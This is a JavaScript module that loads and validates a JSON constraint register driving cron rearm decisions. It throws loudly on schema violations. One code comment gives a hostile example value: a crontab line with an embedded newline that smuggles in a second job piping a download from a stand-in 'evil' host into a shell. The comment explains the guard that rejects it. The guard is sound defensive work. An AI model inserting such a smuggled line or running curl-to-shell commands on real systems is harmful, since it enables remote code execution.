'use strict';

/**
 * register-loader.cjs
 *
 * Loads + validates lib/os/registry/constraint-register.json against the rules documented in
 * constraint-register.schema.json. Hand-rolled validation (no ajv/zod) — zod4 is
 * commander-only per the upstream dep-sweep hold (docs/superpowers/plans-adjacent dep audit), and
 * this repo's other declarative-catalog loaders (heartbeat-registry.cjs, feedback-baseline
 * readers) are all zero-dependency fs+path modules; this module follows that convention.
 *
 * DELIBERATE DIVERGENCE from the fail-open convention used elsewhere in lib/os/services/
 * (heartbeat-registry.cjs's loadRegistry() silently returns [] on a bad file): `loadRegister()`
 * here THROWS loudly on a malformed register. Per the upstream design's HARD RULES ("validate on
 * load, reject schema violations loudly"), rig-sentinel.cjs makes rearm decisions — including a
 * real crontab mutation — based on this data; silently degrading to an empty/partial register
 * would make the sentinel either falsely report "all clear" or attempt rearm logic against
 * malformed entries. A cron job that's about to decide whether to mutate system state should die
 * loudly on bad input, not paper over it. `validateRegister()` itself is pure and non-throwing —
 * callers that only want a validation report (tests, a future reconciliation-sweep lane) can call
 * it directly without the throw.
 */

const fs = require('node:fs');
const path = require('node:path');

const ALLOWED_CLASSES = new Set(['economy', 'security', 'process', 'infra', 'governance']);
const ALLOWED_REARM = new Set(['auto', 'flag-only']);
const ALLOWED_CADENCE = new Set(['daily', 'weekly', 'monthly']);
const ALLOWED_STATUS = new Set(['enforced', 'doctrine-only', 'retiring']);
const ALLOWED_CHECK_TYPES = new Set([
  'grep', 'grep-absent', 'json-path', 'json-path-absent', 'cmd', 'heartbeat', 'crontab-line',
]);
const ID_PATTERN = /^[a-z][a-z0-9-]*$/;
const ISO_DATE_PATTERN = /^\d{4}-\d{2}-\d{2}/;

function defaultRegisterPath(repoRoot) {
  return path.join(repoRoot || process.cwd(), 'lib', 'os', 'registry', 'constraint-register.json');
}

function isPlainObject(v) {
  return v !== null && typeof v === 'object' && !Array.isArray(v);
}

/**
 * Validate a single check object's type-specific required fields.
 * @param {object} check
 * @param {string} where — human-readable location for error messages
 * @returns {string[]} errors
 */
function validateCheckObject(check, where) {
  const errors = [];
  if (!isPlainObject(check)) {
    return [`${where}: check must be an object`];
  }
  if (typeof check.type !== 'string' || !ALLOWED_CHECK_TYPES.has(check.type)) {
    return [`${where}: check.type must be one of ${[...ALLOWED_CHECK_TYPES].join('|')} (got ${JSON.stringify(check.type)})`];
  }
  const requireFields = (fields) => {
    for (const f of fields) {
      if (!(f in check) || typeof check[f] !== 'string' || check[f].length === 0) {
        // maxAgeHours is numeric, handled separately below
        if (f === 'maxAgeHours') continue;
        errors.push(`${where}: check.type=${check.type} requires non-empty string field "${f}"`);
      }
    }
  };
  switch (check.type) {
    case 'grep':
    case 'grep-absent':
      requireFields(['file', 'pattern']);
      break;
    case 'json-path':
    case 'json-path-absent':
      requireFields(['file', 'path']);
      break;
    case 'cmd':
      if (typeof check.bin !== 'string' || check.bin.length === 0) {
        errors.push(`${where}: check.type=cmd requires non-empty string field "bin"`);
      }
      if ('args' in check && !Array.isArray(check.args)) {
        errors.push(`${where}: check.type=cmd "args" must be an array when present`);
      }
      break;
    case 'heartbeat':
      requireFields(['file']);
      if (typeof check.maxAgeHours !== 'number' || !(check.maxAgeHours > 0)) {
        errors.push(`${where}: check.type=heartbeat requires numeric "maxAgeHours" > 0`);
      }
      break;
    case 'crontab-line':
      requireFields(['pattern']);
      break;
    default:
      // unreachable — ALLOWED_CHECK_TYPES guard above already rejects unknown types
      break;
  }
  return errors;
}

/**
 * Validate a check|forbid field, which may be a single check object or an array of them.
 */
function validateCheckField(value, where) {
  if (value === undefined) return [];
  if (Array.isArray(value)) {
    if (value.length === 0) return [`${where}: array form must have at least one check`];
    return value.flatMap((c, i) => validateCheckObject(c, `${where}[${i}]`));
  }
  return validateCheckObject(value, where);
}

/** Flatten a check|forbid field (single object, array, or undefined) into a plain array. */
function flattenChecks(value) {
  if (value === undefined) return [];
  return Array.isArray(value) ? value : [value];
}

/**
 * upstream review P2-1. For a `crontab-line` check whose entry has `rearm:"auto"`, the loader
 * enforces two cross-field invariants that `validateCheckObject` alone can't see (it has no
 * access to the entry-level `rearm` field, and the two fields must agree with each other):
 *
 *   (a) `check.line` must not contain an embedded newline/carriage-return. A `line` value
 *       like `"0 8 * * * good\n* * * * * curl evil|sh"` would install a SECOND, unrelated
 *       cron command from a single register entry the moment `rearmCrontabLine()` appends it
 *       — a smuggle path a JSON diff reviewer can miss (the extra command hides inside a
 *       string literal, not a new top-level field).
 *   (b) `check.pattern`, compiled as a RegExp, must actually MATCH `check.line`. If it
 *       doesn't, `rearmCrontabLine()`'s own idempotency guard (`re.test(current)` before
 *       appending) can never fire true after the rearm, so the SAME line gets appended again
 *       on every subsequent run — unbounded crontab growth, while the entry stays red
 *       forever. This is exactly the misconfiguration class this whole system exists to
 *       catch, so the loader refuses to seed it in the first place.
 *
 * Only checked for `rearm:"auto"` entries — a `crontab-line` check on a `flag-only` entry has
 * no `line` to append (rearm never fires for it), so there's nothing to smuggle or mismatch.
 */
function validateCrontabLineRearmInvariant(entry, where) {
  if (entry.rearm !== 'auto') return [];
  const errors = [];
  const checks = flattenChecks(entry.check).filter((c) => c && c.type === 'crontab-line');
  for (const check of checks) {
    if (typeof check.line !== 'string') {
      errors.push(`${where}: rearm:auto crontab-line check has no "line" to append (rearm can never succeed for this entry)`);
      continue;
    }
    if (/[\r\n]/.test(check.line)) {
      errors.push(`${where}: check.line must not contain an embedded newline/carriage-return (crontab-line smuggle guard — a newline would install a second, unrelated cron command)`);
    }
    if (typeof check.pattern === 'string') {
      try {
        const re = new RegExp(check.pattern, 'm');
        if (!re.test(check.line)) {
          errors.push(`${where}: check.pattern does not match check.line — the rearmed line would never satisfy its own presence check, causing unbounded daily re-append`);
        }
      } catch (err) {
        errors.push(`${where}: check.pattern is not a valid regex: ${err.message}`);
      }
    }
  }
  return errors;
}

/**
 * @param {object} entry
 * @param {number} index
 * @param {Set<string>} seenIds
 * @returns {string[]} errors
 */
function validateEntry(entry, index, seenIds) {
  const where = `constraints[${index}]`;
  const errors = [];
  if (!isPlainObject(entry)) return [`${where}: entry must be an object`];

  if (typeof entry.id !== 'string' || !ID_PATTERN.test(entry.id)) {
    errors.push(`${where}: id must be kebab-case matching ${ID_PATTERN} (got ${JSON.stringify(entry.id)})`);
  } else if (seenIds.has(entry.id)) {
    errors.push(`${where}: duplicate id "${entry.id}"`);
  } else {
    seenIds.add(entry.id);
  }

  if (typeof entry.statement !== 'string' || entry.statement.length === 0) {
    errors.push(`${where} (${entry.id}): statement must be a non-empty string`);
  }
  if (typeof entry.class !== 'string' || !ALLOWED_CLASSES.has(entry.class)) {
    errors.push(`${where} (${entry.id}): class must be one of ${[...ALLOWED_CLASSES].join('|')}`);
  }
  if (!Array.isArray(entry.source) || entry.source.length === 0 || !entry.source.every((s) => typeof s === 'string' && s.length > 0)) {
    errors.push(`${where} (${entry.id}): source must be a non-empty array of non-empty strings`);
  }
  if (typeof entry.rearm !== 'string' || !ALLOWED_REARM.has(entry.rearm)) {
    errors.push(`${where} (${entry.id}): rearm must be one of ${[...ALLOWED_REARM].join('|')}`);
  }
  if (typeof entry.cadence !== 'string' || !ALLOWED_CADENCE.has(entry.cadence)) {
    errors.push(`${where} (${entry.id}): cadence must be one of ${[...ALLOWED_CADENCE].join('|')}`);
  }
  if (typeof entry.status !== 'string' || !ALLOWED_STATUS.has(entry.status)) {
    errors.push(`${where} (${entry.id}): status must be one of ${[...ALLOWED_STATUS].join('|')}`);
  }

  // review_by: required non-null for doctrine-only/retiring; must be null for enforced.
  if (entry.status === 'doctrine-only' || entry.status === 'retiring') {
    if (typeof entry.review_by !== 'string' || !ISO_DATE_PATTERN.test(entry.review_by)) {
      errors.push(`${where} (${entry.id}): status=${entry.status} requires a non-null ISO-date review_by`);
    }
  } else if (entry.status === 'enforced' && entry.review_by !== null) {
    errors.push(`${where} (${entry.id}): status=enforced requires review_by to be null`);
  }

  if (entry.last_ok !== null && typeof entry.last_ok !== 'string') {
    errors.push(`${where} (${entry.id}): last_ok must be a string ISO timestamp or null`);
  }

  // check: required for enforced, optional otherwise ("no check yet" for doctrine-only).
  const checkErrors = validateCheckField(entry.check, `${where} (${entry.id}).check`);
  errors.push(...checkErrors);
  if (entry.status === 'enforced' && entry.check === undefined) {
    errors.push(`${where} (${entry.id}): status=enforced requires a "check"`);
  }

  const forbidErrors = validateCheckField(entry.forbid, `${where} (${entry.id}).forbid`);
  errors.push(...forbidErrors);

  // Cross-field: rearm:auto crontab-line checks need a safe, self-consistent "line".
  if (typeof entry.rearm === 'string' && ALLOWED_REARM.has(entry.rearm)) {
    errors.push(...validateCrontabLineRearmInvariant(entry, `${where} (${entry.id})`));
  }

  if (entry.note !== undefined && typeof entry.note !== 'string') {
    errors.push(`${where} (${entry.id}): note must be a string when present`);
  }

  return errors;
}

/**
 * Pure, non-throwing validator.
 * @param {any} parsed — the parsed JSON value
 * @returns {{ ok: boolean, errors: string[] }}
 */
function validateRegister(parsed) {
  const errors = [];
  if (!isPlainObject(parsed)) {
    return { ok: false, errors: ['register root must be an object'] };
  }
  if (typeof parsed.version !== 'number' || !Number.isInteger(parsed.version) || parsed.version < 1) {
    errors.push('version must be a positive integer');
  }
  if (parsed.description !== undefined && typeof parsed.description !== 'string') {
    errors.push('description must be a string when present');
  }
  if (!Array.isArray(parsed.constraints)) {
    errors.push('constraints must be an array');
    return { ok: false, errors };
  }

  const seenIds = new Set();
  parsed.constraints.forEach((entry, i) => {
    errors.push(...validateEntry(entry, i, seenIds));
  });

  return { ok: errors.length === 0, errors };
}

/**
 * Load + validate the register. THROWS on missing file, bad JSON, or schema violations
 * (see module header for why this diverges from the repo's usual fail-open loaders).
 *
 * @param {string} [registerPath]
 * @returns {{ version: number, description?: string, constraints: object[] }}
 */
function loadRegister(registerPath) {
  const p = registerPath || defaultRegisterPath();
  let raw;
  try {
    raw = fs.readFileSync(p, 'utf8');
  } catch (err) {
    throw new Error(`register-loader: cannot read ${p}: ${err.message}`, { cause: err });
  }
  let parsed;
  try {
    parsed = JSON.parse(raw);
  } catch (err) {
    throw new Error(`register-loader: ${p} is not valid JSON: ${err.message}`, { cause: err });
  }
  const { ok, errors } = validateRegister(parsed);
  if (!ok) {
    throw new Error(`register-loader: ${p} failed schema validation:\n  - ${errors.join('\n  - ')}`);
  }
  return parsed;
}

module.exports = {
  loadRegister,
  validateRegister,
  validateEntry,
  validateCheckObject,
  validateCrontabLineRearmInvariant,
  defaultRegisterPath,
  ALLOWED_CLASSES,
  ALLOWED_REARM,
  ALLOWED_CADENCE,
  ALLOWED_STATUS,
  ALLOWED_CHECK_TYPES,
};
